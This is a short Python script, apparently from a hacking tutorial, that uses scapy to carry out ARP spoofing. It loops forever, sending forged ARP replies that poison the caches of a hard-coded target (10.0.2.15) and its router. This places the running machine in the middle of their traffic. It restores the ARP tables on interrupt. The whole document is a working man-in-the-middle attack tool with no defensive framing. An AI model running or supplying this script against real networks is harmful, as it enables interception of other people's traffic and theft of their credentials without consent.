
import scapy.all as scapy
import time
import sys

def get_mac_address(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_req_b = broadcast/arp_req
    answered_list = scapy.srp(arp_req_b, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac_address(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dst_ip, src_ip):
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=get_mac_address(dst_ip), psrc=src_ip, hwsrc=get_mac_address(src_ip))
    scapy.send(packet, count=4, verbose=False)

target_ip = "10.0.2.15"
router_ip = "10.0.2.1"
packets_amount = 0

try:
    while True:
        spoof(target_ip, router_ip)
        spoof(router_ip, target_ip)
        packets_amount+=2
        print("\r[+] Packets sent: ", str(packets_amount), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Program has been stopped, ARP tables will be reseted")
    restore(target_ip, router_ip)
    restore(router_ip, target_ip)
